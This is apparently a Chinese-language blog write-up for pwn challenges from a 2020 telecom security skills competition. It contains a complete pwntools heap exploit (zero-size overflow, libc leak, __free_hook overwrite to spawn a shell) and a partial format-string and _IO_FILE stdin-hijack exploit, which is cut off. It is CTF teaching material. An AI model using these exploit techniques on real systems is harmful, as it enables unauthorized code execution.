<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP</title>
      <link href="1970/01/01/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/"/>
      <url>1970/01/01/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>自己只做了pwn2，就从pwn2开始</p><p>c++用于输入输出,主要逻辑是用c实现的。因为会调用c++的库，这里涉及到一些库的库的加载。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836235597.png" alt="add"></p><p>当进行add的时候如果size为0将会成功申请空间</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836644128.png" alt="edit"></p><p>在edit的时候如果size为0可以无限制的获取输入，造成了堆溢出。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>1.libc2.27需要填满tcach然后泄露libc地址。但是这里泄露出来的libc如下图，泄露出来的是第二条线的地址，实际上需要的是第一条线的地址，实际上这几部分是同一个库，相对的偏移都是固定的。</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836598126.png" alt="加载"></p><ul><li>2.用fastbin attack劫持__malloc_hook，2.27使得可以申请到任何一段空间不需要size的限制。实际上__malloc_hook劫持成one_gatget这里不行。实际用system函数劫持__free_hook</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836619586.png" alt="free_hook"></p><p>这里有一个问题：__free_hook看到的地址是在data区域,但是pwntools的symbols还是获取到了正确的偏移。</p><ul><li>3.保存点小技巧：</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  debug_str <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>    text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap &amp;#123;&amp;#125;| awk '&amp;#123;&amp;#123;print $1&amp;#125;&amp;#125;'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'x /10xg &amp;#123;&amp;#125;\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'b *&amp;#123;&amp;#125;\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span></code></pre><p>可以很方便调试开启了PIE的程序，把命令改掉可以换成下断点</p><p> Ubuntu18使用fastbin attack是直接把fd指针指向要修改的地址就好</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># _*_ coding:utf-8 _*_</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># context.terminal=['tmux', 'splitw', '-h']</span>prog <span class="token operator">=</span> <span class="token string">'./noteplus'</span><span class="token comment" spellcheck="true"># #elf = ELF(prog)</span><span class="token comment" spellcheck="true"># # p = process(prog)#,env=&amp;#123;"LD_PRELOAD":"./libc-2.27.so"&amp;#125;)</span><span class="token comment" spellcheck="true"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span><span class="token comment" spellcheck="true"># p = remote("121.36.245.213", 23333)</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span>local<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">from</span> one_gadget <span class="token keyword">import</span> generate_one_gadget<span class="token keyword">if</span> local<span class="token punctuation">:</span>    path_to_libc <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>    one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f3d5</span><span class="token punctuation">,</span><span class="token number">0x4f432</span><span class="token punctuation">,</span><span class="token number">0x10a41c</span><span class="token punctuation">]</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span>prog<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x10a45c</span><span class="token punctuation">,</span> <span class="token number">0x4f3c2</span><span class="token punctuation">,</span> <span class="token number">0x4f365</span><span class="token punctuation">]</span>    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"121.36.245.213"</span><span class="token punctuation">,</span> <span class="token number">23333</span><span class="token punctuation">)</span>    path_to_libc<span class="token operator">=</span><span class="token string">"/media/tower/data/work/ctf/dianxin/pwn2/460f7fe9177846df879863c485e2940b/libc-2.27.so"</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>path_to_libc<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token keyword">def</span> <span class="token function">one_gadget_list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> offset <span class="token keyword">in</span> generate_one_gadget<span class="token punctuation">(</span>path_to_libc<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>        one<span class="token punctuation">.</span>append<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    <span class="token keyword">return</span> one<span class="token comment" spellcheck="true"># one=one_gadget_list()</span><span class="token comment" spellcheck="true"># p = process(["/glibc/2.27/64/lib/ld-2.27.so", "./pwn"], env=&amp;#123;"LD_PRELOAD": "/glibc/2.27/64/lib/libc.so.6"&amp;#125;)</span><span class="token comment" spellcheck="true"># p = process(["./libc-2.27.so", "./noteplus"], env=&amp;#123;"LD_PRELOAD": "./libc-2.27.so"&amp;#125;)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  debug_str <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>    text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap &amp;#123;&amp;#125;| awk '&amp;#123;&amp;#123;print $1&amp;#125;&amp;#125;'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'x /10xg &amp;#123;&amp;#125;\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'b *&amp;#123;&amp;#125;\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">New</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"ize: "</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">View</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>index<span class="token operator">=</span><span class="token number">0x8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>index<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>View<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>libc_content<span class="token operator">=</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>libc_content<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xb78</span><span class="token operator">-</span><span class="token number">0x1b8</span><span class="token operator">-</span><span class="token number">0x3eb000</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># New(str(5),str(0x68))</span><span class="token comment" spellcheck="true"># New(str(6),str(0x68))</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Delete(str(5))</span><span class="token comment" spellcheck="true"># print(hex(libc.symbols["__malloc_hook"]))</span><span class="token comment" spellcheck="true">#0x354b78</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># debug([0x203320])</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(hex(libc.sym["realloc"]))</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p64(libc.symbols["__malloc_hook"]-0x3eb000-8+13)+"\n")</span><span class="token comment" spellcheck="true"># New(str(6),str(0x68))</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00\n"</span><span class="token punctuation">)</span>debug<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x203320</span><span class="token punctuation">]</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>__isoc99_scanf   调用_IO_vfscanf_internal 调用__GI__IO_default_uflow 调用_IO_new_file_underflow</p><pre class=" language-c++"><code class="language-c++">int_IO_new_file_underflow (FILE *fp)&#123;  ssize_t count;  /* C99 requires EOF to be "sticky".  */  if (fp->_flags & _IO_EOF_SEEN)    return EOF;  if (fp->_flags & _IO_NO_READS)    &#123;      fp->_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  if (fp->_IO_read_ptr < fp->_IO_read_end)   //检查:_IO_read_ptr要比_IO_read_end大    return *(unsigned char *) fp->_IO_read_ptr;  if (fp->_IO_buf_base == NULL)//缓冲区为空分配空间    &#123;      /* Maybe we already have a push back pointer.  */      if (fp->_IO_save_base != NULL)        &#123;          free (fp->_IO_save_base);          fp->_flags &= ~_IO_IN_BACKUP;        &#125;      _IO_doallocbuf (fp);    &#125;  /* FIXME This can/should be moved to genops ?? */  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))    &#123;      /* We used to flush all line-buffered stream.  This really isn't         required by any standard.  My recollection is that         traditional Unix systems did this for stdout.  stderr better         not be line buffered.  So we do just that here         explicitly.  --drepper */      _IO_acquire_lock (stdout);      if ((stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))          == (_IO_LINKED | _IO_LINE_BUF))        _IO_OVERFLOW (stdout, EOF);      _IO_release_lock (stdout);    &#125;  _IO_switch_to_get_mode (fp);  /* This is very tricky. We have to adjust those     pointers before we call _IO_SYSREAD () since     we may longjump () out while waiting for     input. Those pointers may be screwed up. H.J. */  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;  fp->_IO_read_end = fp->_IO_buf_base;  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end    = fp->_IO_buf_base;  count = _IO_SYSREAD (fp, fp->_IO_buf_base,                       fp->_IO_buf_end - fp->_IO_buf_base);//向_IO_buf_base处写入数据,读取的实际长度是_IO_buf_end -_IO_buf_base  if (count <= 0)    &#123;      if (count == 0)        fp->_flags |= _IO_EOF_SEEN;      else        fp->_flags |= _IO_ERR_SEEN, count = 0;  &#125;  fp->_IO_read_end += count;//读取结束后_IO_read_end加上读取的长度  if (count == 0)    &#123;      /* If a stream is read to EOF, the calling application may switch active         handles.  As a result, our offset cache would no longer be valid, so         unset it.  */      fp->_offset = _IO_pos_BAD;      return EOF;    &#125;  if (fp->_offset != _IO_pos_BAD)    _IO_pos_adjust (fp->_offset, count);  return *(unsigned char *) fp->_IO_read_ptr;&#125;</code></pre><p>这里是把数据读到缓冲区,read_ptr指针是把数据从缓冲区读到用户空间,所以这里read_ptr指针要比较大</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604907487628.png" alt="指针情况"></p><p>实际IO_file结构在内存中的情况是</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604909452890.png" alt="IO_file结构"></p><h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><p>泄露libc加载地址。是原始偏移加上栈上的偏移，一般情况下64位程序的原始偏移是6，如题的0xf+6=21，wp里面用%21$p进行泄露.</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604902851396.png" alt="偏移"></p><h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><ul><li>用格式化字符串漏洞修改栈里面的_IO_file结构</li><li>用scanf函数向修改后的_IO_buf_base结构写入数据修改_IO_buf_base和_IO_buf_end 指针修改为main函数的返回地址(一个栈地址)</li><li>持续的getchar让_IO_read_ptr追上_IO_read_end指针,这样才能再次读入数据</li><li>修改返回地址</li></ul><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x83</span> <span class="token operator">+</span> _IO_2_1_stdin_addr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_ret <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>echo2<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>debug<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x000000000000106D</span><span class="token punctuation">,</span><span class="token number">0x000000000000FFE</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>完成上面第二步,在标记的地方就是写入数据开始的地方(原来IO_read_base指向的地方)</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604910603484.png" alt="修改后的IO_file"></p><p>但是这时read_ptr指针是小于read_end指针的所以需要调用多次getchar()实际上应该是调用lenpayload次(在发送上面payload的时候已经调用了一次,后面还需要lenpayload-1次)</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./Echo"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./Echo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>libccontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token comment" spellcheck="true"># p = remote('121.36.216.253',10001)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap &amp;#123;&amp;#125;| awk '&amp;#123;&amp;#123;print $1&amp;#125;&amp;#125;'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>         <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *&amp;#123;&amp;#125;\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *&amp;#123;&amp;#125;\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"User name:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">echo</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice 